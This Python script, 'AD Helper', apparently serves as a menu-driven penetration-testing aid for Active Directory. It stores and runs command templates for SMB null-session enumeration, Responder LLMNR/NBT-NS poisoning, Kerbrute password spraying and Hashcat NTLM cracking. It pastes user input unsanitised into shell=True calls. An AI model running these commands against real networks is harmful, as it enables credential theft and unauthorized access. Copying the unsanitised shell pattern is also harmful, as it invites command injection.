import subprocess
import re

class Tool:
    def __init__(self, name):
        self.name = name
        self.options = []

    def add_option(self, name, description, command, example):
        self.options.append({'name': name, 'description': description, 'command': command, 'example': example})

    def display_options(self):
        print(f"Options for {self.name}:")
        for i, option in enumerate(self.options, start=1):
            print(f"{i}) {option['description']}")

    def handle_options(self, option):
        try:
            option = int(option)
            selected_option = self.options[option - 1]
            print(f"\n{selected_option['name']}\nDescription: {selected_option['description']}\nUsage: {selected_option['command']}\nExample: {selected_option['example']}\n")
            return selected_option['command']
        except (ValueError, IndexError):
            return "Invalid option"

#CrackMapExec
crackmapexec = Tool("CrackMapExec")
crackmapexec.add_option("Enumerate Shares", "Enumerate SMB shares", "crackmapexec smb <target_ip> -u '' -p '' --shares", "crackmapexec smb 172.16.5.7 -u '' -p '' --shares")
crackmapexec.add_option("Enumerate Users", "Enumerate users on the target using SMB", "crackmapexec smb <target_ip> -u '' -p '' --users", "crackmapexec smb 172.16.5.7 -u '' -p '' --users")
crackmapexec.add_option("Enumerate Groups", "Enumerate groups on the target using SMB", "crackmapexec smb <target_ip> -u '' -p '' --groups", "crackmapexec smb 172.16.5.7 -u '' -p '' --groups")
crackmapexec.add_option("Enumerate Password Policy", "Enumerate the password policy for the target using SMB", "crackmapexec smb <target_ip> -u '' -p '' --pass-pol", "crackmapexec smb 172.16.5.7 -u '' -p '' --pass-pol")

#Impacket
impacket = Tool("Impacket")

#Responder
responder = Tool("Responder")
responder.add_option("analysis mode", "Start Responder in analysis mode", "responder -I <interface> -A", "responder -I eth0 -A")
responder.add_option("network traffic response spoofing", "Start Responder in network traffic response spoofing mode", "responder -I <interface> -w -d", "responder -I eth0 -w -d")
responder.add_option("LLMNR/NBT-NS/MDNS poisoner", "Start Responder in LLMNR/NBT-NS/MDNS poisoner mode", "responder -I <interface> -wrf", "responder -I eth0 -wrf")

#Kerbrute
kerbrute = Tool("Kerbrute")
kerbrute.add_option("enumerate valid AD users for password spraying", "Enumerate valid AD users for password spraying with kerbrute", "kerbrute userenum --dc <target_ip> -d <domain_name> <user_list> -o kerb-results", "kerbrute userenum --dc 172.16.5.7 -d megacorp.local users.txt -o kerb-results")
kerbrute.add_option("password spray", "Perform a password spraying attack using kerbrute", "kerbrute passwordspray --dc <target_ip> -d <domain_name> <user_list> <password_list/password>", "kerbrute passwordspray --dc 172.16.5.7 -d megacorp.local users.txt passwords.txt/Welcome1")

#Hashcat
hashcat = Tool("Hashcat")
hashcat.add_option("NTLM hash cracking", "Crack NTLM hashes with hashcat", "hashcat -m 1000 <hash_file> <wordlist>", "hashcat -m 1000 hash.txt rockyou.txt")
hashcat.add_option("NTLMv2 hash cracking", "Crack NTLMv2 hashes with hashcat", "hashcat -m 5600 <hash_file> <wordlist>", "hashcat -m 5600 hash.txt rockyou.txt")

def run_command(command):

    placeholders = re.findall(r"<(.*?)>", command)
    replacements = {}

    for placeholder in placeholders:
        replacements[placeholder] = input(f"Enter {placeholder.replace('_', ' ')}: ")
    
    for placeholder, replacement in replacements.items():
        command = command.replace(f"<{placeholder}>", replacement)

    print("\n-----------Running command-----------\n")
    subprocess.run(command, shell=True)
    exit()

# Displays all options that contain the search term in the description

def module_search(tools):

    search = input("\nEnter search term (q to quit): ").split(" ")
    if search == "q":
        exit()

    print("\n-----------Search results-----------\n")

    for tool in tools:
        for option in tool.options:
            if all(term.lower() in option['description'].lower() for term in search):
                print(f"{tool.name}: {option['description']}")           

# Displays a list of ad tools in numerical order
def ad_help_list():
    tools = [crackmapexec, impacket, responder, kerbrute, hashcat]

    print("Select a tool:")
    for i, tool in enumerate(tools, start=1):
        print(f"{i}) {tool.name}")
    # for searching functionality
    print(f"{len(tools) + 1}) Search through all tools and options")

    tool_choice = input("\nEnter the number of the tool (q to quit): ")

    if tool_choice == "q":
        exit()

    try:
        if int(tool_choice) == len(tools) + 1:
            command = module_search(tools)

            if command != "Invalid option":
                inp = input("Do you want to run the command selected? (Y/y)")
                if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                    run_command(command)
        else:
            tool_choice = int(tool_choice)
            selected_tool = tools[tool_choice - 1]

            selected_tool.display_options()
            option = input("\nEnter the number of the option (q to quit): ")

            if option == "q":
                exit()

            return selected_tool.handle_options(option)
    except (ValueError, IndexError):
        return "Invalid option"

if __name__ == "__main__":

    print("""\n
    _    ____    _   _      _
   / \  |  _ \  | | | | ___| |_ __   ___ _ __
  / _ \ | | | | | |_| |/ _ \ | '_ \ / _ \ '__|
 / ___ \| |_| | |  _  |  __/ | |_) |  __/ |
/_/   \_\____/  |_| |_|\___|_| .__/ \___|_|
                             |_|\n
    """)

    command = ad_help_list()

    if command != "Invalid option":

        inp = input("Do you want to run the command selected? (Y/y)")
        if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
            run_command(command)
    else:
        print("Invalid option")